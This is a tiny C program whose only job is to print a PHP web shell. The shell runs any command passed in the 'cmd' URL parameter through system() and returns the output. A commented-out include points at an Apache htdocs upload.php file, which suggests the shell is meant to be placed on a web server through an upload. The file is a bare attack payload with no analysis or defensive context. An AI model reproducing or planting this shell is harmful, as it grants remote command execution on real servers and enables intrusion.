#include <stdio.h>
// #include "/usr/local/apache2/htdocs/upload.php"

int main(void) {
    char *php = "<?php if(isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?>";
    printf("%s\n", php);
    return 0;
}